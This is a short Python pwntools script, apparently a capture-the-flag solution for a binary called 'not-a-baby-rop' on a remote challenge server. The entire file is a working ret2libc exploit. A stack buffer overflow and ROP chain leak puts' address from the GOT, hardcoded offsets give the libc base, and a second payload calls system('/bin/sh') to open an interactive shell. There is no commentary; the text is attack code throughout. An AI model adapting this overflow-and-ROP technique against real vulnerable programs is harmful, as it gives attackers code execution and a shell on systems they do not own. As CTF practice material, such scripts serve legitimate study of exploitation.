# -*- coding:utf-8 -*-
from pwn import *
context.log_level="debug"
#io=process("./not-a-baby-rop")
io=remote("warzone.hackrocks.com",7770)
elf=ELF("./not-a-baby-rop")

puts_got=elf.got["puts"]
puts_plt=elf.plt["puts"]
pop_rdi=0x40122b
ret=0x401016
io.recvuntil("what u got\n")
payload=b"a"*0x88+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x401142)
io.sendline(payload)
puts_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("puts_addr=="+hex(puts_addr))
libc_base=puts_addr-0x71910
print("libc_base=="+hex(libc_base))
system=libc_base+0x449c0
binsh=libc_base+0x180519

payload=b"a"*0x88+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
io.sendline(payload)

io.interactive()
